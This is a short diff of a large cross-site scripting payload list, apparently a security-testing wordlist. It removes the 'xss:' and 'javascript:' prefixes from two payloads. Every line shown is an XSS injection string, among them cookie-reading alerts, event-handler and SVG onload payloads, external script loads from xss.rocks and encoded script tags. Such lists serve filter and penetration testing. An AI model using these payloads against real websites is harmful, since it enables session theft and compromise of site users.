@@ -8450,7 +8450,7 @@ xss=500); alert(document.cookie);//
 <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
-xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+ex/*XSS*//*/*/pression(alert("XSS"))'>
 Set.constructor`alert\x28document.domain\x29```
 <iframe src=http://xss.rocks/scriptlet.html <
 <IMG SRC="`<javascript:alert>`('XSS')"
@@ -8465,6 +8465,6 @@ Set.constructor`alert\x28document.domain\x29```
 \<a onmouseover=alert(document.cookie)\>xxs link\</a\>
 \<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
 <IMG SRC=`javascript:alert("Soufiane says, 'XSS'")`>
-javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 %C0%BCscript%C0%A0src%C0%BD%C0%82mymethod%C0%A8%C0%A9%C0%82%C0%A0%C0%AF%C0%BE
